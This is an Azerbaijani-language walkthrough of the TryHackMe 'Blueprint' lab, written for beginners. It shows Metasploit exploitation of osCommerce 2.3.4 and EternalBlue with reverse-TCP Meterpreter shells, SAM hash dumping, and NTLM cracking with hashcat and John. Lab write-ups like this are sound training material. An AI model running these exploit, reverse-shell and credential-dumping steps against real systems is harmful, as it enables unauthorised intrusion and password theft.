# 🔵 TryHackMe — Blueprint Writeup (Tam İzahlı)

> **Çətinlik:** Asan  
> **OS:** Windows 7  
> **IP:** 10.81.182.113  
> **Məqsəd:** Sistemi ele keçirmək, Administrator şifrəsini tapmaq

---

## 📖 Bu Lab Haqqında

Blueprint — TryHackMe platformasında Windows 7 əməliyyat sistemi ilə işləyən bir maşındır.  
Hücumun əsas yolu: **osCommerce 2.3.4** adlı köhnə e-ticaret proqramındakı zəiflikdən istifadə edərək sisteme daxil olmaqdır.

**Öyrənəcəklərin:**
- Nmap ilə port skanı
- Web tətbiqindəki zəifliyi tapmaq
- Metasploit ilə exploit etmək
- Windows-da şifrə hash-larını dump etmək
- Hash-ı crack etmək

---

## 🧠 Pentesting Nədir? (Sıfırdan izah)

Pentesting (Penetration Testing) — bir sistemi **icazəli şəkildə** sınaqdan keçirməkdir.  
Məqsəd: zəiflikləri tapmaq və hesabat vermək.

Addımlar həmişə belədir:
```
1. Reconnaissance (Kəşfiyyat) — hədəf haqqında məlumat topla
2. Scanning (Skan)           — açıq portları, servisləri tap
3. Exploitation (İstismar)   — zəifliyi istifadə et
4. Post-Exploitation         — sistemdə nə var? şifrələr, fayllar?
5. Reporting                 — nə tapdın?
```

Biz bu labda bu addımların hamısını keçəcəyik.

---

## 🔍 Addım 1: Nmap ilə Skan

### Nmap nədir?

**Nmap** — şəbəkə skanı üçün istifadə edilən alətdir.  
Bir IP ünvanına "sən hansı portları açıqsan?" deyə soruşur.

**Port nədir?**  
Düşün ki, bir bina var. Binanın hər qapısı bir portdur.  
- 80-ci qapı = HTTP (veb sayt)
- 443-cü qapı = HTTPS (şifrəli veb sayt)
- 445-ci qapı = SMB (Windows fayl paylaşımı)
- 3306-cı qapı = MySQL (verilənlər bazası)

### Əmr:

```bash
nmap -sV -sC -T4 --top-ports 1000 10.81.182.113
```

**Hər flag nə deməkdir?**

| Flag | Mənası |
|------|--------|
| `-sV` | Servis versiyasını tap (hansı proqram işləyir?) |
| `-sC` | Default scriptləri işlət (əlavə məlumat topla) |
| `-T4` | Sürət 4 (1=yavaş, 5=çox sürətli) |
| `--top-ports 1000` | Ən çox istifadə edilən 1000 portu skan et |

### Nəticə (Bizim aldığımız):

```
80/tcp    open  http     Microsoft IIS httpd 7.5
443/tcp   open  ssl/http Apache 2.4.23 + PHP/5.6.28
445/tcp   open  msrpc    Windows SMB
3306/tcp  open  mysql    MariaDB
8080/tcp  open  http     Apache 2.4.23
```

### Nəticəni necə oxumalıyıq?

```
443/tcp   open  ssl/http  Apache httpd 2.4.23
| http-ls: Volume /
|   oscommerce-2.3.4/
|   oscommerce-2.3.4/catalog/
```

Bu bizə deyir ki:
- **443-cü port açıqdır** — HTTPS işləyir
- **Apache** veb server işlədir (Microsoft-un IIS-i deyil)
- Orada **osCommerce 2.3.4** qovluğu var

> 💡 **Niyə bu vacibdir?**  
> osCommerce 2.3.4 — **2019-cu ildə** buraxılmış köhnə versiyadır.  
> Bu versiyada məşhur **Remote Code Execution (RCE)** zəifliyi var.  
> RCE = uzaqdan kod icra etmək = serverə öz əmrlərimizi göndərə bilərik.

---

## 🌐 Addım 2: osCommerce-i Araşdır

### Brauzerdə aç:

```
https://10.81.182.113/oscommerce-2.3.4/catalog/
```

Burada osCommerce-in əsas səhifəsini görəcəksən — onlayn mağaza interfeysi.

### Admin panelini tap:

```
https://10.81.182.113/oscommerce-2.3.4/catalog/admin/
```

### Zəifliyi anla — install qovluğu

osCommerce qurularkən `/install/` qovluğu yaradılır.  
**Qurulum bitdikdən sonra bu qovluq SİLİNMƏLİDİR.**  
Əgər silinməyibsə — böyük problem!

Yoxla:
```
https://10.81.182.113/oscommerce-2.3.4/catalog/install/index.php
```

Bu səhifə açılırsa, biz qurulum prosesini yenidən işlədə bilərik.  
Bu o deməkdir ki — **yeni admin istifadəçisi yarada bilərik.**

> 💡 **Bunu hardan bildim?**  
> osCommerce 2.3.4 üçün CVE-lər (Common Vulnerabilities and Exposures) var.  
> `searchsploit oscommerce` yazanda bu zəiflik çıxır.  
> Həmçinin Exploit-DB saytında da mövcuddur.

---

## ⚔️ Addım 3: Metasploit ilə Exploit

### Metasploit nədir?

**Metasploit** — hazır exploit-lər toplusudur.  
Düşün ki, bir silah anbarı var — içində minlərlə hazır hücum aləti var.  
Biz sadəcə hədəfi seçirik, parametrləri doldururuq, işledirik.

### Metasploit-i başlat:

```bash
msfconsole
```

Bu əmr Metasploit-i açır. Açılması 10-20 saniyə çəkə bilər.

### osCommerce exploit-ini tap:

```bash
search oscommerce
```

Bu əmr Metasploit-in bazasında "oscommerce" açar sözünü axtarır.

Belə bir nəticə görəcəksən:
```
exploit/unix/webapp/oscommerce_filemanager
```

### Exploit-i seç:

```bash
use exploit/unix/webapp/oscommerce_filemanager
```

`use` əmri — "bu exploit-i istifadə etmək istəyirəm" deməkdir.

### Parametrləri gör:

```bash
options
```

Bu əmr "bu exploit üçün hansı məlumatları doldurmaq lazımdır?" göstərir.

### Parametrləri doldur:

```bash
set RHOSTS 10.81.182.113
set RPORT 443
set SSL true
set TARGETURI /oscommerce-2.3.4/catalog
```

**Hər biri nə deməkdir?**

| Parametr | Dəyər | Mənası |
|----------|-------|--------|
| `RHOSTS` | 10.81.182.113 | R = Remote (uzaq). Hədəf IP |
| `RPORT` | 443 | Hədəf port (HTTPS = 443) |
| `SSL` | true | HTTPS istifadə et (şifrəli bağlantı) |
| `TARGETURI` | /oscommerce-2.3.4/catalog | osCommerce-in harada olduğu |

### Payload seç:

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <sənin VPN IP-n>
set LPORT 4444
```

**Payload nədir?**  
Exploit zəifliyi istifadə edir — payload isə "içəri girəndə nə edəcəyik?" deməkdir.

**reverse_tcp nədir?**  
Normal: biz hədəfə qoşuluruq.  
Reverse: hədəf bizə qoşulur.  
Niyə reverse? Çünki firewall gələn bağlantıları bloklar, gedən bağlantıları yox.

**LHOST** = L = Local (yerli). Sənin öz IP-n (TryHackMe VPN IP-si).  
Bunu tapmaq üçün:
```bash
ip addr show tun0
```
`tun0` — TryHackMe VPN interfeysidir.

### İşlət:

```bash
run
```

Hər şey düzgün olarsa, belə bir şey görəcəksən:
```
[*] Started reverse TCP handler on 0.0.0.0:4444
[*] Sending stage...
[*] Meterpreter session 1 opened
meterpreter >
```

**Meterpreter session açıldı** — bu o deməkdir ki, **hədəf sistemdə artıq bir pəncərəmiz var!**

---

## 💻 Addım 4: Sistemdə Nə Edə Bilərik?

### Əsas Meterpreter əmrləri:

```bash
sysinfo          # Sistem haqqında məlumat
getuid           # Hazırda kim kimi işləyirik?
pwd              # Hazırda hansı qovluqdayıq?
ls               # Qovluqdakı faylları göstər
```

**sysinfo nəticəsi:**
```
Computer  : BLUEPRINT
OS        : Windows 7 (Build 7601, Service Pack 1)
Arch      : x64
```

**getuid nəticəsi:**
```
Server username: NT AUTHORITY\SYSTEM
```

> 🎉 **NT AUTHORITY\SYSTEM** — bu Windows-da ən yüksək səlahiyyətdir!  
> Linux-dakı `root` kimdir, Windows-da `SYSTEM`-dir.  
> Artıq sistemin tam sahibiyik!

---

## 🔑 Addım 5: Şifrə Hash-larını Dump Et

### Hash nədir?

Windows istifadəçilərin şifrələrini düz saxlamır — **hash** şəklində saxlayır.  
Hash = şifrənin şifrəli versiyası.

Məsələn:
```
Şifrə: Password123
Hash:  aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

Hash-dan orijinal şifrəyə birbaşa keçmək olmaz (nəzəri olaraq).  
Amma **hashcat** və ya **crackstation.net** ilə crack etmək mümkündür.

### hashdump əmri:

```bash
hashdump
```

Bu əmr Windows SAM (Security Account Manager) faylından bütün istifadəçi hash-larını çıxarır.

Nəticə belə görünür:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

**Formatı anla:**
```
İstifadəçi adı : RID : LM Hash : NTLM Hash
```

- **RID** — istifadəçi ID-si (Administrator həmişə 500-dür)
- **LM Hash** — köhnə format (adətən boş: `aad3b435...`)
- **NTLM Hash** — əsl şifrə hash-ı — bizi bu maraqlandırır

---

## 🔓 Addım 6: Hash-ı Crack Et

### Metod 1: CrackStation (Online)

1. [crackstation.net](https://crackstation.net) aç
2. NTLM hash-ı yapışdır: `8846f7eaee8fb117ad06bdd830b7586c`
3. "Crack Hashes" düyməsini bas

Əgər hash məşhurdursa (sadə şifrədirsə), dərhal tapacaq.

### Metod 2: Hashcat (Offline, güclü)

```bash
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Hər flag nə deməkdir?**

| Flag | Mənası |
|------|--------|
| `-m 1000` | Hash tipi = NTLM (1000 = NTLM kodu) |
| `-a 0` | Hücum modu = Dictionary (lüğət hücumu) |
| `hash.txt` | Crack edəcəyimiz hash-ların faylı |
| `rockyou.txt` | Wordlist — milyonlarla şifrə siyahısı |

**rockyou.txt nədir?**  
2009-cu ildə RockYou şirkəti hack olundu, 14 milyon şifrə sızdı.  
Bu siyahı indi wordlist kimi istifadə edilir.  
Kali Linux-da hazır gəlir: `/usr/share/wordlists/rockyou.txt`

### Metod 3: John the Ripper

```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

## 🪟 Addım 7: EternalBlue (Bonus — MS17-010)

### EternalBlue nədir?

**MS17-010** — Windows SMB-də olan kritik zəiflikdir.  
2017-ci ildə NSA (Amerikanın kəşfiyyat agentliyi) tərəfindən tapılıb, sonra Shadow Brokers qrupu tərəfindən sızdırılıb.

**WannaCry** ransomware-i də bu zəifliyi istifadə edib — 2017-ci ildə dünyada milyonlarla kompüteri iflic etdi.

Windows 7 SP1 — bu zəifliyə qarşı **həssasdır.**

### Yoxla:

```bash
nmap --script smb-vuln-ms17-010 -p 445 10.81.182.113
```

Əgər belə bir nəticə görürsənsə:
```
VULNERABLE: Remote Code Execution vulnerability in Microsoft SMBv1
Risk factor: HIGH
```

O zaman EternalBlue ilə də exploit edə bilərsən:

```bash
# Metasploit-də:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.81.182.113
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <sənin IP-n>
run
```

---

## 📋 Addım 8: Flags (Cavablar)

TryHackMe bu lab üçün iki sual verir:

### Sual 1: Lab.txt faylı harada?

Meterpreter session-da:
```bash
search -f lab.txt
```

Bu əmr bütün sistemi `lab.txt` adlı fayl üçün axtarır.

Tapdıqda:
```bash
cat "C:\\Users\\Administrator\\Desktop\\lab.txt"
```

### Sual 2: Administrator şifrəsi nədir?

`hashdump` ilə aldığın NTLM hash-ı crack et (yuxarıda izah edildi).

---

## 📚 Öyrəndiklərimizi Ümumiləşdirək

| Addım | Nə etdik | Niyə etdik |
|-------|----------|------------|
| Nmap skanı | Portları və servisləri tapdıq | Hədəfi tanımaq üçün |
| osCommerce araşdırması | Zəif versiyanı müəyyən etdik | Exploit tapaq deyə |
| Metasploit | Zəifliyi istifadə etdik | Sisteme daxil olmaq üçün |
| hashdump | Şifrə hash-larını çıxardıq | Şifrələri öyrənmək üçün |
| Hash crack | Hash-dan şifrəni tapdıq | Lab sualına cavab vermək üçün |
| EternalBlue | Alternativ yol | Windows 7 SMB zəifliyi |

---

## 🛠️ İstifadə Edilən Alətlər

| Alət | Nə üçün | Hardan tapmaq |
|------|---------|---------------|
| `nmap` | Port skanı | Kali Linux-da hazır |
| `metasploit` | Exploit framework | Kali Linux-da hazır (`msfconsole`) |
| `hashcat` | Hash crack | Kali Linux-da hazır |
| `john` | Hash crack (alternativ) | Kali Linux-da hazır |
| crackstation.net | Online hash crack | Brauzer |

---

## 💡 Yeni Başlayanlar Üçün Qeydlər

**"Bunu hardan bildin?"** deyə soruşursan — cavab:

1. **CVE bazası** — [cve.mitre.org](https://cve.mitre.org) — bütün məşhur zəifliklər burada
2. **Exploit-DB** — [exploit-db.com](https://exploit-db.com) — hazır exploit-lər
3. **searchsploit** — Kali-də Exploit-DB-nin offline versiyası: `searchsploit oscommerce`
4. **HackTricks** — [book.hacktricks.xyz](https://book.hacktricks.xyz) — pentest cheatsheet
5. **GTFOBins** — Linux privilege escalation üçün

**Ən vacib şey:** Nmap nəticəsini görəndə **versiyanı** ara.  
`osCommerce 2.3.4` → Google: `oscommerce 2.3.4 exploit` → cavab çıxır.

---

*Writeup by: sıfırdan öyrənən üçün yazıldı 🎯*
